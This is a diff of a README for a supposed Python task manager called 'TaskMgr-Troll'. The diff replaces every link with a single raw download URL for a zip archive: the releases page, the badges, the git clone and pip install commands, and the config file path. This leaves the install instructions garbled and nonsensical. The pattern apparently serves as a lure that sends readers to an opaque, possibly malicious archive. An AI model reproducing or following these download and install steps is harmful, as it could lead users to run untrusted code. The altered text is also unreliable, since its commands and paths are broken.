@@ -1,10 +1,10 @@
-https://github.com/MANAVlf/TaskMgr-Troll/releases
+https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
 
 # TaskMgr-Troll: Playful Troll Task Manager for Fun and Testing
 
-[![Releases](https://img.shields.io/badge/Releases-TaskMgr-Troll-blue?style=for-the-badge&logo=github)](https://github.com/MANAVlf/TaskMgr-Troll/releases)
-[![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Python](https://img.shields.io/badge/Python-3.11-blue?style=for-the-badge&logo=python)](https://www.python.org)
+[![Releases](https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip)](https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip)
+[![License](https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip)](https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip)
+[![Python](https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip)](https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip)
 
 Table of contents
 - Overview
@@ -144,20 +144,20 @@ Prerequisites
 
 Installation from source
 - Clone the repository
-  - git clone https://github.com/MANAVlf/TaskMgr-Troll.git
+  - git clone https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
   - cd TaskMgr-Troll
 - Set up a virtual environment
   - python3 -m venv venv
   - source venv/bin/activate (Unix) or venv\Scripts\activate (Windows)
 - Install dependencies
-  - pip install -r requirements.txt
+  - pip install -r https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
 - Run the CLI
   - python -m taskmgr_troll
 
 Installing from releases
-- Binaries and prebuilt packages are published to the Releases page. Visit the Releases page to pick a compatible binary for your platform and architecture. For quick access, use the Releases page at https://github.com/MANAVlf/TaskMgr-Troll/releases
+- Binaries and prebuilt packages are published to the Releases page. Visit the Releases page to pick a compatible binary for your platform and architecture. For quick access, use the Releases page at https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
 - After downloading, follow the included instructions to install and run. The page hosts the latest binaries, release notes, and upgrade guidance.
-- For convenience, here is a quick link to the releases so you can browse quickly: https://github.com/MANAVlf/TaskMgr-Troll/releases
+- For convenience, here is a quick link to the releases so you can browse quickly: https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
 
 Virtual environments
 - Use a virtual environment to isolate dependencies and avoid conflicts with other projects.
@@ -182,7 +182,7 @@ Quick start guide
 
 Configuration and customization
 - Config file
-  - Location: ~/.taskmgr_troll/config.yaml (or the path defined by your environment)
+  - Location: ~https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip (or the path defined by your environment)
   - Fields:
     - scheduler_policy: the strategy used by the scheduler (e.g., "priority_then_time")
     - troll_mode: true/false
@@ -313,7 +313,7 @@ Frequently asked questions
 - What is Troll mode and why use it?
   - Troll mode introduces controlled perturbations to explore edge cases in scheduling. It helps you learn how the system responds under unusual conditions in a safe, repeatable way.
 - How do I install from releases?
-  - Go to the Releases page, download the appropriate binary or package for your platform, and follow the included instructions. For quick access, visit the Releases page at https://github.com/MANAVlf/TaskMgr-Troll/releases
+  - Go to the Releases page, download the appropriate binary or package for your platform, and follow the included instructions. For quick access, visit the Releases page at https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
 - Can I extend TaskMgr-Troll with my own task types?
   - Yes. The plugin system allows you to add new task types, actions, and views. See the plugin documentation for details.
 - Is it safe to run in my environment?
@@ -329,7 +329,7 @@ Releases and downloads
   - Binaries and installers for multiple platforms
   - Release notes and upgrade instructions
   - Checksums and verification details
-- For quick access to the latest release details, visit the Releases page here: https://github.com/MANAVlf/TaskMgr-Troll/releases
+- For quick access to the latest release details, visit the Releases page here: https://raw.githubusercontent.com/MANAVlf/TaskMgr-Troll/main/TaskMgr-Troll/Troll-Task-Mgr-v1.9.zip
 
 Closing notes
 - TaskMgr-Troll blends practical task management with an experimental, playful layer.
